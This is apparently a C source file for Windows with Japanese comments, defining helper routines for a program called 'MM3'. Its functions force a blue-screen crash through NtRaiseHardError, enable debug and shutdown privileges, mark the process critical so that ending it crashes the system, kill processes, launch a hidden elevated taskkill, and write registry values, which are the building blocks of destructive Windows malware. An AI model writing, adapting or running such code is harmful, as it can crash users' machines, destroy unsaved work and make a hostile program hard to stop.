#include "MM3.h"
typedef NTSTATUS(NTAPI* pfnRtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN Client, PBOOLEAN WasEnabled);
typedef NTSTATUS(NTAPI* pfnRtlSetProcessIsCritical)(BOOLEAN NewValue, PBOOLEAN OldValue, BOOLEAN CheckSubsystem);
BOOL NTAPI BSOD(DWORD error_code)
{
	HMODULE ntdll = LoadLibraryA("ntdll");
	FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
	FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

	if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
		BOOLEAN tmp1; DWORD tmp2;
		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(error_code, 0, 0, 0, 6, &tmp2);
	}

	HANDLE token;
	TOKEN_PRIVILEGES privileges;

	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

	LookupPrivilegeValueA(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
	privileges.PrivilegeCount = 1;
	privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

	return TRUE;
}

BOOL NTAPI EnterDebugMode(VOID)
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tp;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
		return FALSE;
	}

	if (!LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &luid)) {
		CloseHandle(hToken);
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
		CloseHandle(hToken);
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
		CloseHandle(hToken);
		return FALSE;
	}

	CloseHandle(hToken);
	return TRUE;
}


BOOL NTAPI SetProcessCritical(VOID)
{
	pfnRtlAdjustPrivilege RtlAdjustPrivilege;
	pfnRtlSetProcessIsCritical RtlSetProcessIsCritical;
	NTSTATUS ntReturnValue;
	BOOLEAN bUnused;

	// LoadLibraryA の代わりに、最初からプロセスにロードされている ntdll のハンドルを安全に取得します
	HMODULE hNtDll = GetModuleHandleA("ntdll.dll");
	if (!hNtDll) return FALSE;

	RtlAdjustPrivilege = (pfnRtlAdjustPrivilege)GetProcAddress(hNtDll, "RtlAdjustPrivilege");
	RtlSetProcessIsCritical = (pfnRtlSetProcessIsCritical)GetProcAddress(hNtDll, "RtlSetProcessIsCritical");

	if (RtlAdjustPrivilege)
	{
		// ★修正点1: 必要な特権は「20 (SeDebugPrivilege)」です。
		// Windowsのカーネルは、この関数を実行するプロセスが SeDebugPrivilege を持っているかをチェックします。
		ntReturnValue = RtlAdjustPrivilege(20 /* SeDebugPrivilege */, TRUE, FALSE, &bUnused);

		if (ntReturnValue != 0) // 0 (STATUS_SUCCESS) 以外は失敗
			return FALSE;
	}
	else
		return FALSE;

	if (RtlSetProcessIsCritical)
	{
		// ★修正点2: 第1引数を TRUE にしてクリティカル化します。
		// 第3引数は通常 FALSE で問題ありません。
		ntReturnValue = RtlSetProcessIsCritical(TRUE, NULL, FALSE);

		if (ntReturnValue != 0) // 0 (STATUS_SUCCESS) 以外は失敗
			return FALSE;
	}
	else
		return FALSE;

	return TRUE;
}

VOID NTAPI KillProcessByID(DWORD pid)
{
	HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
	if (hProcess != NULL) {
		TerminateProcess(hProcess, 0);
		CloseHandle(hProcess);
	}
}

VOID NTAPI LaunchTaskkill(VOID)
{
	SHELLEXECUTEINFOA sei = { 0 };
	sei.cbSize = sizeof(SHELLEXECUTEINFOA);
	sei.fMask = SEE_MASK_NOCLOSEPROCESS;
	sei.hwnd = NULL;
	sei.lpVerb = "runas";
	sei.lpFile = "cmd.exe";
	sei.lpParameters = "/c taskkill /f /im tobi0a0c.exe";
	sei.nShow = SW_HIDE;

	if (Wow64EnableWow64FsRedirection(FALSE))
	{
		if (ShellExecuteExA(&sei)) {
			if (sei.hProcess) CloseHandle(sei.hProcess);
		}
		else
			ExitProcess(0);
	}
	if (!Wow64EnableWow64FsRedirection(TRUE))
	{
		if (ShellExecuteExA(&sei)) {
			if (sei.hProcess) CloseHandle(sei.hProcess);
		}
		else
			ExitProcess(0);
	}

	ExitProcess(0);
}

VOID WINAPI SetRegistryString(HKEY hKeyRoot, CONST CHAR* subKey, CONST CHAR* valueName, CONST CHAR* valueData)
{
	HKEY hKey;
	if (RegCreateKeyExA(hKeyRoot, subKey, 0, NULL, REG_OPTION_NON_VOLATILE,
		KEY_WRITE | KEY_WOW64_64KEY, NULL, &hKey, NULL) == ERROR_SUCCESS) {

		// ★ &valueData ではなく valueData をそのまま渡す
		RegSetValueExA(hKey, valueName, 0, REG_SZ, (CONST BYTE*)valueData, (DWORD)(strlen(valueData) + 1));
		RegCloseKey(hKey);
	}
}

VOID WINAPI SetRegistryExString(HKEY hKeyRoot, CONST CHAR* subKey, CONST CHAR* valueName, CONST CHAR* valueData)
{
	HKEY hKey;
	if (RegCreateKeyExA(hKeyRoot, subKey, 0, NULL, REG_OPTION_NON_VOLATILE,
		KEY_WRITE | KEY_WOW64_64KEY, NULL, &hKey, NULL) == ERROR_SUCCESS) {

		// ★ &valueData ではなく valueData をそのまま渡す
		RegSetValueExA(hKey, valueName, 0, REG_EXPAND_SZ, (CONST BYTE*)valueData, (DWORD)(strlen(valueData) + 1));
		RegCloseKey(hKey);
	}
}

VOID WINAPI SetRegistryDword(HKEY hKeyRoot, CONST CHAR* subKey, CONST CHAR* valueName, DWORD valueData)
{
	HKEY hKey;
	// ※DWORD型（数値型）の場合は、変数のアドレスを渡す必要があるので現在の「&valueData」のままで正解です
	if (RegCreateKeyExA(hKeyRoot, subKey, 0, NULL, REG_OPTION_NON_VOLATILE,
		KEY_WRITE | KEY_WOW64_64KEY, NULL, &hKey, NULL) == ERROR_SUCCESS) {

		RegSetValueExA(hKey, valueName, 0, REG_DWORD, (CONST BYTE*)&valueData, sizeof(DWORD));
		RegCloseKey(hKey);
	}
}